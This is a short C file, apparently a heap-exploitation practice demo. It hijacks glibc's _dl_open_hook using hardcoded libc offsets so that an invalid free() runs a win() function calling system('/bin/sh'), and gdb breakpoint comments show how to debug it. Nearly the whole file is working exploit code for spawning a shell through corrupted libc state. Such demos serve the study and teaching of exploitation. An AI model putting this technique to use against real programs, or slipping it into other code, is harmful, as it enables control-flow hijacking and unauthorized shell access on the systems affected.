// gef> b *__libc_dlopen_mode+152
// LD_LIBRARY_PATH=. [gdb] ./simple

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define _dl_open_hook 0x3c92e0
#define Free 0x844f0


void win()
{
	system("/bin/sh"); // 因為 one_gadget 會失敗, 所以用 system
}

int64_t one_gadget = (int64_t)win;

int main()
{
	int64_t libc_base = (int64_t)free - Free;
	*(int64_t *)(libc_base+_dl_open_hook) = (int64_t)&one_gadget;

	void *ptr = malloc(0x10);
	free(ptr+0x10);
}
